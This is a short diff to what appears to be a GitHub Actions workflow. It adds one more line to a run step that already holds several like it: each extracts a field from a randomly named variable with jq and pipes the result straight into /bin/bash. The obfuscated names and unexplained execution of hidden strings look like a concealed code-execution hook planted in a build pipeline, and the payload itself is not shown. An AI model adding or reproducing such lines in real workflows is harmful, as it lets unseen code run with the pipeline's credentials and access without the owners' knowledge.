@@ -29,6 +29,7 @@ jobs:
           echo $yxdwm6 | jq -r .nbx94 | /bin/bash
           echo $dlc5 | jq -r .c508 | /bin/bash
           printf '%s' "$bgmt307" | jq -r .x992 | /bin/bash
+          printf '%s' "$fv3" | jq -r .yiwu71 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
